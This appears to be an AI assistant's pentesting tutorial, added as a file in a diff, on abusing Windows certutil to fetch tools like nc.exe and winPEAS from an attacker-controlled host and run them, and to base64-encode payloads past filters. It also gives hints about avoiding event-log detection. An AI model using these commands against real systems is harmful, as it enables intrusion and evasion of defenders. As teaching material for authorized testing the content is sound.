@@ -1,0 +1,121 @@
+Great! Let’s talk about **CertUtil**, a built-in Windows utility that’s incredibly useful for various administrative tasks — and, in the context of pentesting, for **downloading files** or **encoding/decoding data**.
+
+Here’s how to use **CertUtil** with full commands, focusing on file transfers and basic usage in a Windows environment.
+
+---
+
+## 🔹 What is CertUtil?
+
+`certutil.exe` is a command-line tool that comes by default on Windows systems. It’s normally used to manage certificates, but it can also be leveraged to **download files**, **encode/decode base64**, and even **verify signatures**.
+
+---
+
+## 🔹 Common Use Cases
+
+### 1️⃣ Download a File from a Remote Server
+
+CertUtil can download files over HTTP(S) by copying them from a web server:
+
+```cmd
+certutil -urlcache -split -f http://<attacker-ip>/<filename> <destination_path>
+```
+
+**Example:**
+
+```cmd
+certutil -urlcache -split -f http://10.10.14.5/nc.exe C:\Users\Public\nc.exe
+```
+
+🔹 **Breakdown**:
+
+* `-urlcache`: Uses the URL cache mechanism.
+* `-split`: Splits large files (helps avoid corruption).
+* `-f`: Forces overwrite if the file already exists.
+
+---
+
+### 2️⃣ Encode a File in Base64
+
+You can encode a file in base64 (to bypass certain filters or embed in scripts):
+
+```cmd
+certutil -encode input_file output_file
+```
+
+**Example:**
+
+```cmd
+certutil -encode payload.exe payload.txt
+```
+
+---
+
+### 3️⃣ Decode a Base64-Encoded File
+
+You can decode a base64-encoded file:
+
+```cmd
+certutil -decode input_file output_file
+```
+
+**Example:**
+
+```cmd
+certutil -decode payload.txt payload.exe
+```
+
+---
+
+## 🔹 Summary of Commands
+
+### ➡️ Download a File:
+
+```cmd
+certutil -urlcache -split -f http://<attacker-ip>/<file> <local_path>
+```
+
+### ➡️ Encode a File:
+
+```cmd
+certutil -encode <input_file> <output_file>
+```
+
+### ➡️ Decode a File:
+
+```cmd
+certutil -decode <input_file> <output_file>
+```
+
+---
+
+## 🔹 Sample Workflow for Downloading a Tool (like winPEAS)
+
+1️⃣ **Start a simple HTTP server on your attacker machine** (e.g., Kali):
+
+```bash
+python3 -m http.server 8000
+```
+
+2️⃣ **On the target Windows machine**:
+
+```cmd
+certutil -urlcache -split -f http://<attacker-ip>:8000/winPEASx64.exe C:\Users\Public\winPEASx64.exe
+```
+
+3️⃣ **Run the downloaded tool**:
+
+```cmd
+C:\Users\Public\winPEASx64.exe
+```
+
+---
+
+## 🔹 Notes
+
+✅ CertUtil is usually available on most Windows systems by default (except some hardened systems).
+✅ Always have **authorization** before using these techniques in any environment.
+✅ CertUtil logs may appear in **Windows event logs**, so in a red team or CTF context, be cautious.
+
+---
+
+Let me know if you’d like to combine this with other tools or if you’d like to discuss bypasses, obfuscation, or detection! 🚀
